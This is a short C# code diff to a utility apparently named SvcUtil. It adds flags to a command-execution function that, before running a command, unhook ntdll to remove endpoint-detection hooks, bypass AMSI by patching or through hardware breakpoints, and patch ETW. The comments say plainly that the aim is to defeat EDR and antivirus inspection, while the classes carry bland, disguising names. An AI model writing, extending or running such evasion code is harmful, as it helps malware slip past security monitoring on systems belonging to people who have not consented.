@@ -24,11 +24,23 @@ namespace SvcUtil
         /// is executed as a separate short-lived process.
         /// </summary>
         public static bool Execute(string commandLine, IShellStream stream,
-                                    bool patchScan = false)
+                                    bool patchScan = false,
+                                    bool hwBpScan = false,
+                                    bool unhookNtdll = false)
         {
-            // Patch current process (useful for in-process operations)
+            // Ntdll unhooking — restore clean .text from disk
+            // Removes ALL EDR inline hooks on ntdll (Nt* functions)
+            if (unhookNtdll)
+                NtdllUnhook.Run();
+
+            // AMSI bypass for in-process operations
             if (patchScan)
                 Ctx.Run();
+            else if (hwBpScan)
+            {
+                Ctx.A1(); // ETW patch — needed even after unhook
+                AmsiHwBp.Install();
+            }
 
             bool usePwsh = Ctx.Chk(commandLine);
 
